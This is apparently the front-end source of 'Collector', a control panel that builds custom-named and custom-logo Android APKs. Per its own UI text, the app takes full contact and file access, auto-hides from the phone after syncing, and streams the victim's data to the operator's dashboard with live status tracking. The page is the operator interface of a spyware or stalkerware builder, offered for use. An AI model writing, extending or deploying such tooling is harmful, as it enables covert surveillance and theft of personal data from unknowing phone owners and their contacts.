'use client';

import React, { useState, useCallback, useRef, useEffect } from 'react';
import {
  Phone,
  Download,
  Users,
  ChevronRight,
  Clock,
  Smartphone,
  Trash2,
  X,
  Image as ImageIcon,
  Loader2,
  FolderOpen,
  Shield,
  Copy,
  Check,
  Wifi,
  WifiOff,
  Package,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Avatar, AvatarFallback } from '@/components/ui/avatar';
import { Badge } from '@/components/ui/badge';

// ─── Types ───────────────────────────────────────────────

type SessionStatus =
  | 'apk_built'
  | 'waiting_install'
  | 'app_installed'
  | 'permissions_granted'
  | 'syncing_contacts'
  | 'syncing_files'
  | 'live_connected'
  | 'offline';

interface StatusEntry {
  status: SessionStatus;
  timestamp: string;
  detail?: string;
}

interface SessionInfo {
  id: string;
  count: number;
  fileCount: number;
  appName: string;
  createdAt: string;
  status: SessionStatus | null;
  statusHistory: StatusEntry[];
  lastHeartbeat: string | null;
  buildId: string | null;
  isOnline: boolean;
}

// ─── Step definitions ───────────────────────────────────

const STATUS_STEPS: { key: SessionStatus; label: string }[] = [
  { key: 'apk_built', label: 'APK Built' },
  { key: 'waiting_install', label: 'Waiting' },
  { key: 'app_installed', label: 'Installed' },
  { key: 'permissions_granted', label: 'Permissions' },
  { key: 'syncing_contacts', label: 'Contacts' },
  { key: 'syncing_files', label: 'Files' },
  { key: 'live_connected', label: 'Live' },
];

function getStepIndex(status: SessionStatus | null): number {
  if (!status) return -1;
  const idx = STATUS_STEPS.findIndex(s => s.key === status);
  return idx;
}

// ─── Utilities ──────────────────────────────────────────

const AVATAR_COLORS = [
  'bg-emerald-600', 'bg-teal-600', 'bg-cyan-600', 'bg-green-700',
  'bg-lime-700', 'bg-emerald-700', 'bg-teal-700', 'bg-cyan-700',
];

function getAvatarColor(name: string): string {
  let hash = 0;
  for (let i = 0; i < name.length; i++) {
    hash = name.charCodeAt(i) + ((hash << 5) - hash);
  }
  return AVATAR_COLORS[Math.abs(hash) % AVATAR_COLORS.length];
}

function timeAgo(dateStr: string): string {
  const now = new Date();
  const date = new Date(dateStr);
  const diffMs = now.getTime() - date.getTime();
  const diffMins = Math.floor(diffMs / 60000);
  const diffHours = Math.floor(diffMs / 3600000);
  const diffDays = Math.floor(diffMs / 86400000);

  if (diffMins < 1) return 'Just now';
  if (diffMins < 60) return `${diffMins}m ago`;
  if (diffHours < 24) return `${diffHours}h ago`;
  if (diffDays < 7) return `${diffDays}d ago`;
  return date.toLocaleDateString();
}

// ─── Mini Step Tracker Component ─────────────────────────

function MiniStepTracker({ status }: { status: SessionStatus | null }) {
  const currentIdx = getStepIndex(status);

  return (
    <div className="flex items-center gap-0.5 mt-1">
      {STATUS_STEPS.map((step, idx) => {
        const isCompleted = idx < currentIdx;
        const isCurrent = idx === currentIdx;
        const isFuture = idx > currentIdx;

        return (
          <div key={step.key} className="flex items-center">
            <div
              className={`w-2 h-2 rounded-full transition-colors ${
                isCompleted
                  ? 'bg-[#25D366]'
                  : isCurrent
                  ? 'bg-[#25D366] animate-pulse'
                  : isFuture
                  ? 'bg-gray-200'
                  : 'bg-gray-200'
              }`}
              title={step.label}
            />
            {idx < STATUS_STEPS.length - 1 && (
              <div
                className={`w-1.5 h-0.5 ${
                  idx < currentIdx ? 'bg-[#25D366]' : 'bg-gray-200'
                }`}
              />
            )}
          </div>
        );
      })}
      <span className="text-[9px] text-gray-400 ml-1">
        {currentIdx >= 0 ? STATUS_STEPS[currentIdx].label : 'Pending'}
      </span>
    </div>
  );
}

// ─── Main App Component ─────────────────────────────────

export default function CollectorHome() {
  const [sessions, setSessions] = useState<SessionInfo[]>([]);
  const [showDialog, setShowDialog] = useState(false);
  const [appName, setAppName] = useState('');
  const [appLogo, setAppLogo] = useState<File | null>(null);
  const [logoPreview, setLogoPreview] = useState<string | null>(null);
  const [building, setBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Fetch sessions from API (used by polling effect)
  // Note: actual fetch is inlined in useEffect to avoid lint issue

  // Initial fetch and auto-poll every 10 seconds
  useEffect(() => {
    let active = true;

    const doFetch = async () => {
      try {
        const res = await fetch('/api/sessions');
        if (res.ok && active) {
          const data = await res.json();
          setSessions(data);
        }
      } catch {}
    };

    doFetch();
    const interval = setInterval(doFetch, 10000);
    return () => {
      active = false;
      clearInterval(interval);
    };
  }, []);

  const copyViewLink = useCallback(async (id: string) => {
    const url = `${window.location.origin}/view/${id}`;
    try {
      await navigator.clipboard.writeText(url);
    } catch {
      const textarea = document.createElement('textarea');
      textarea.value = url;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
    }
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  }, []);

  // Handle logo file selection
  const handleLogoChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setAppLogo(file);
      const reader = new FileReader();
      reader.onload = (ev) => setLogoPreview(ev.target?.result as string);
      reader.readAsDataURL(file);
    }
  }, []);

  // Build & download custom APK
  const handleBuildAndDownload = useCallback(async () => {
    if (!appName.trim()) return;

    setBuilding(true);
    setBuildProgress('Preparing app...');

    try {
      const formData = new FormData();
      formData.append('appName', appName.trim());
      if (appLogo) {
        formData.append('logo', appLogo);
      }

      setBuildProgress('Building your custom app...');

      const res = await fetch('/api/build-app', {
        method: 'POST',
        body: formData,
      });

      if (!res.ok) {
        const errData = await res.json().catch(() => null);
        const errMsg = errData?.error || errData?.details || 'Build failed. The server may not support APK building.';
        throw new Error(errMsg);
      }

      setBuildProgress('App built! Downloading...');

      // Get the APK as blob
      const blob = await res.blob();

      // Verify it's actually an APK (not an error JSON response with wrong content-type)
      if (blob.size < 1000 || blob.type.includes('json')) {
        throw new Error('Received invalid APK file. The server may not have Android SDK installed.');
      }

      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `${appName.trim().replace(/\s+/g, '-').toLowerCase()}.apk`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      setBuildProgress('Download complete!');
      // Refresh sessions to show the new stub session
      setTimeout(() => {
        try {
          fetch('/api/sessions').then(r => r.ok ? r.json() : []).then(data => { if (Array.isArray(data)) setSessions(data); }).catch(() => {});
        } catch {}
        setShowDialog(false);
        setAppName('');
        setAppLogo(null);
        setLogoPreview(null);
      }, 1000);
    } catch (err: any) {
      alert(err.message || 'Failed to build app. Please try again.');
    } finally {
      setBuilding(false);
      setBuildProgress('');
    }
  }, [appName, appLogo]);

  // ═══════════════════════════════════════════════════════
  //  RENDER
  // ═══════════════════════════════════════════════════════

  return (
    <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
      {/* ─── Header ──────────────────────────────────── */}
      <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md z-10">
        <div className="w-9 h-9 rounded-full bg-white/20 flex items-center justify-center">
          <Shield className="w-5 h-5 text-white" />
        </div>
        <div className="flex-1 min-w-0">
          <h1 className="text-white font-bold text-lg">Collector</h1>
          <p className="text-white/60 text-xs">Access Control Panel</p>
        </div>
      </div>

      {/* ─── Hero Section ────────────────────────────── */}
      <div className="bg-gradient-to-b from-[#075E54] to-[#054D44] px-6 pt-6 pb-10">
        <div className="text-center mb-6">
          <div className="w-24 h-24 rounded-full bg-white/10 flex items-center justify-center mx-auto mb-5 shadow-lg">
            <div className="w-16 h-16 rounded-full bg-[#25D366] flex items-center justify-center">
              <Shield className="w-8 h-8 text-white" />
            </div>
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">Collector</h2>
          <p className="text-white/60 text-sm max-w-xs mx-auto">
            Set app name &amp; logo → Download → Install → Allow → All data appears here
          </p>
        </div>

        {/* Download App Button */}
        <Button
          onClick={() => setShowDialog(true)}
          className="w-full bg-[#25D366] hover:bg-[#20BD5A] text-white font-bold h-16 rounded-2xl text-lg shadow-lg active:scale-[0.98] transition-transform"
        >
          <Download className="w-6 h-6 mr-3" />
          Download App
        </Button>

        <p className="text-white/40 text-center text-xs mt-3 leading-relaxed">
          Set your custom app name &amp; logo, then download. <br/>
          Install → Allow Contact &amp; File permission → App auto-hides → Data appears here.
        </p>
      </div>

      {/* ─── How it Works ────────────────────────────── */}
      <div className="px-4 py-5 bg-white mx-3 -mt-4 rounded-2xl shadow-sm mb-4">
        <h3 className="text-[#075E54] font-bold text-sm mb-4 flex items-center gap-2">
          <Smartphone className="w-4 h-4" />
          How it works
        </h3>
        <div className="space-y-3">
          {[
            { step: '1', title: 'Set Name & Logo', desc: 'Enter your app name and upload a logo' },
            { step: '2', title: 'Download & Install', desc: 'Your custom app is built and downloaded' },
            { step: '3', title: 'Allow Permissions', desc: 'Allow Contact + File Manager access' },
            { step: '4', title: 'App Auto-Hides', desc: 'App disappears from phone after data sync' },
            { step: '5', title: 'Control from Here', desc: 'Full access to contacts & files from website' },
          ].map((item) => (
            <div key={item.step} className="flex items-start gap-3">
              <div className="w-7 h-7 rounded-full bg-[#25D366] flex items-center justify-center shrink-0 mt-0.5">
                <span className="text-white font-bold text-xs">{item.step}</span>
              </div>
              <div>
                <p className="text-sm font-semibold text-gray-900">{item.title}</p>
                <p className="text-xs text-gray-500">{item.desc}</p>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* ─── Access Status Cards ─────────────────────── */}
      <div className="px-3 pb-4">
        <h3 className="text-[#075E54] font-bold text-sm mb-3 px-1 flex items-center gap-2">
          <Shield className="w-4 h-4" />
          Access Status
        </h3>
        <div className="grid grid-cols-2 gap-3">
          <div className="bg-white rounded-2xl shadow-sm p-4 text-center">
            <div className="w-12 h-12 rounded-full bg-[#25D366]/10 flex items-center justify-center mx-auto mb-2">
              <Phone className="w-6 h-6 text-[#25D366]" />
            </div>
            <p className="text-sm font-bold text-gray-900">Contact</p>
            <p className="text-xs text-gray-500">Full Access</p>
          </div>
          <div className="bg-white rounded-2xl shadow-sm p-4 text-center">
            <div className="w-12 h-12 rounded-full bg-blue-500/10 flex items-center justify-center mx-auto mb-2">
              <FolderOpen className="w-6 h-6 text-blue-500" />
            </div>
            <p className="text-sm font-bold text-gray-900">File Manager</p>
            <p className="text-xs text-gray-500">Full Access</p>
          </div>
        </div>
      </div>

      {/* ─── Contact History Section ─────────────────── */}
      <div className="px-3 pb-4">
        <div className="flex items-center justify-between mb-3 px-1">
          <h3 className="text-[#075E54] font-bold text-sm flex items-center gap-2">
            <Clock className="w-4 h-4" />
            My History
          </h3>
          {sessions.length > 0 && (
            <Badge className="bg-[#25D366] text-white border-0 text-xs px-2 py-0.5">
              {sessions.length} session{sessions.length > 1 ? 's' : ''}
            </Badge>
          )}
        </div>

        {sessions.length === 0 ? (
          <div className="bg-white rounded-2xl shadow-sm p-8 text-center">
            <div className="w-16 h-16 rounded-full bg-gray-100 flex items-center justify-center mx-auto mb-4">
              <Users className="w-8 h-8 text-gray-300" />
            </div>
            <p className="text-gray-500 text-sm font-medium mb-1">No data yet</p>
            <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
              Download the app and allow permissions — your contacts &amp; files will appear here
            </p>
          </div>
        ) : (
          <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
            {sessions.map((session, index) => (
              <React.Fragment key={session.id}>
                <div
                  className="w-full"
                >
                  <a
                    href={`/view/${session.id}`}
                    className="w-full flex items-center gap-3 px-4 py-3 hover:bg-[#F0F0F0] transition-colors active:bg-[#E8E8E8]"
                  >
                    <Avatar className="w-11 h-11 shrink-0">
                      <AvatarFallback className={`${getAvatarColor(session.appName || 'C')} text-white font-bold text-sm`}>
                        {session.appName ? session.appName.slice(0, 2).toUpperCase() : 'CO'}
                      </AvatarFallback>
                    </Avatar>
                    <div className="flex-1 min-w-0 text-left">
                      <div className="flex items-center gap-2">
                        <h4 className="text-sm font-semibold text-gray-900 truncate">
                          {session.appName || 'Collector'}
                        </h4>
                        {/* LIVE/OFFLINE indicator */}
                        {session.isOnline ? (
                          <span className="inline-flex items-center gap-1 text-[10px] font-bold text-[#25D366]">
                            <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
                            LIVE
                          </span>
                        ) : session.status && session.status !== 'apk_built' ? (
                          <span className="inline-flex items-center gap-1 text-[10px] font-bold text-gray-400">
                            <span className="w-2 h-2 rounded-full bg-gray-300" />
                            OFFLINE
                          </span>
                        ) : null}
                      </div>
                      <p className="text-xs text-gray-500 flex items-center gap-2">
                        <span>{session.count} contacts</span>
                        <span className="text-gray-300">|</span>
                        <span>{session.fileCount || 0} files</span>
                        <span className="text-gray-300">|</span>
                        <Clock className="w-3 h-3" />
                        {timeAgo(session.createdAt)}
                      </p>
                      {/* Mini step tracker */}
                      <MiniStepTracker status={session.status} />
                    </div>
                    <div className="flex items-center gap-1">
                      {/* Copy view link button */}
                      <button
                        onClick={(e) => { e.preventDefault(); copyViewLink(session.id); }}
                        className="w-8 h-8 rounded-full hover:bg-[#075E54]/10 flex items-center justify-center transition-colors"
                        title="Copy view link"
                      >
                        {copiedId === session.id ? (
                          <Check className="w-4 h-4 text-[#25D366]" />
                        ) : (
                          <Copy className="w-4 h-4 text-gray-400" />
                        )}
                      </button>
                      <button
                        onClick={(e) => { e.preventDefault(); }}
                        className="w-8 h-8 rounded-full hover:bg-red-50 flex items-center justify-center transition-colors"
                        title="Remove from history"
                      >
                        <Trash2 className="w-4 h-4 text-gray-400" />
                      </button>
                      <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
                    </div>
                  </a>
                </div>
                {index < sessions.length - 1 && (
                  <div className="ml-[68px] border-b border-gray-100" />
                )}
              </React.Fragment>
            ))}
          </div>
        )}
      </div>

      {/* ─── Footer ──────────────────────────────────── */}
      <div className="mt-auto px-4 py-3 bg-white border-t border-gray-100">
        <p className="text-center text-xs text-gray-400">
          Collector &bull; Access Control Panel &bull; Android Only
        </p>
      </div>

      {/* ═══════════════════════════════════════════════════ */}
      {/* ─── DOWNLOAD DIALOG (Name + Logo) ──────────────── */}
      {/* ═══════════════════════════════════════════════════ */}
      {showDialog && (
        <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center">
          {/* Backdrop */}
          <div
            className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            onClick={() => !building && setShowDialog(false)}
          />

          {/* Dialog */}
          <div className="relative w-full max-w-md mx-4 mb-4 sm:mb-0 bg-white rounded-3xl shadow-2xl overflow-hidden animate-in slide-in-from-bottom-4 duration-300">
            {/* Dialog Header */}
            <div className="bg-gradient-to-r from-[#075E54] to-[#054D44] px-6 py-5">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-white font-bold text-lg">Build Your App</h3>
                  <p className="text-white/60 text-xs mt-1">Set app name &amp; logo to build your custom app</p>
                </div>
                <button
                  onClick={() => !building && setShowDialog(false)}
                  className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center"
                >
                  <X className="w-5 h-5 text-white/70" />
                </button>
              </div>
            </div>

            {/* Dialog Body */}
            <div className="px-6 py-6 space-y-5">
              {/* App Logo Upload */}
              <div className="flex flex-col items-center">
                <button
                  onClick={() => fileInputRef.current?.click()}
                  className="w-24 h-24 rounded-2xl border-2 border-dashed border-gray-300 hover:border-[#25D366] bg-gray-50 hover:bg-[#25D366]/5 flex flex-col items-center justify-center transition-colors overflow-hidden"
                  disabled={building}
                >
                  {logoPreview ? (
                    <img src={logoPreview} alt="App Logo" className="w-full h-full object-cover rounded-2xl" />
                  ) : (
                    <>
                      <ImageIcon className="w-8 h-8 text-gray-400 mb-1" />
                      <span className="text-[10px] text-gray-400">Upload Logo</span>
                    </>
                  )}
                </button>
                <input
                  ref={fileInputRef}
                  type="file"
                  accept="image/*"
                  onChange={handleLogoChange}
                  className="hidden"
                />
                <p className="text-xs text-gray-400 mt-2">
                  {logoPreview ? 'Tap to change logo' : 'Tap to upload app logo (optional)'}
                </p>
              </div>

              {/* App Name Input */}
              <div>
                <label className="text-sm font-semibold text-gray-700 mb-2 block">App Name</label>
                <Input
                  value={appName}
                  onChange={(e) => setAppName(e.target.value)}
                  placeholder="Enter your app name..."
                  className="h-12 rounded-xl text-base border-gray-200 focus:border-[#25D366] focus:ring-[#25D366]/20"
                  disabled={building}
                  maxLength={30}
                />
                <p className="text-xs text-gray-400 mt-1">
                  This name will appear on your installed app
                </p>
              </div>

              {/* Permissions Info */}
              <div className="bg-gray-50 rounded-xl p-4">
                <p className="text-xs font-semibold text-gray-600 mb-2">This app will request:</p>
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-full bg-[#25D366]/10 flex items-center justify-center">
                      <Phone className="w-3.5 h-3.5 text-[#25D366]" />
                    </div>
                    <span className="text-xs text-gray-600">Contact Full Access</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-full bg-blue-500/10 flex items-center justify-center">
                      <FolderOpen className="w-3.5 h-3.5 text-blue-500" />
                    </div>
                    <span className="text-xs text-gray-600">File Manager Full Access</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-full bg-orange-500/10 flex items-center justify-center">
                      <Shield className="w-3.5 h-3.5 text-orange-500" />
                    </div>
                    <span className="text-xs text-gray-600">Auto-hide after sync</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Dialog Footer */}
            <div className="px-6 pb-6">
              <Button
                onClick={handleBuildAndDownload}
                disabled={!appName.trim() || building}
                className="w-full bg-[#25D366] hover:bg-[#20BD5A] text-white font-bold h-14 rounded-2xl text-base shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {building ? (
                  <>
                    <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                    {buildProgress || 'Building...'}
                  </>
                ) : (
                  <>
                    <Download className="w-5 h-5 mr-2" />
                    Build &amp; Download App
                  </>
                )}
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
